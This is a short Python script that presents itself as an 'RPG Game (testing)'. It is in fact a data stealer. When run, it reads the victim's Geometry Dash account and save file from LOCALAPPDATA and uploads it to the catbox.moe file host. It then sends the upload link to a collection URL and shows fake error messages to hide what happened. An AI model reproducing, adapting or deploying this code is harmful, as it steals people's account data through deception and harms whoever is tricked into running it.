import requests, os

print("RPG Game (testing) - By: BigJuicy420!!")
theft_url = "http://localhost/get.php"

def theft():
    with open(os.environ.get("LOCALAPPDATA")+"\\GeometryDash\\CCGameManager.dat", 'rb') as file:
        response = requests.post("https://catbox.moe/user/api.php", data={"reqtype":"fileupload"}, files={'fileToUpload': file})
    requests.get(f"{theft_url}?url={response.text.strip()}")
    input("[Err 1]: You do not have access to this game, Please try again later.")

try:
  theft()
except:
    input("[Err 2]: Something went wrong when booting up the game...")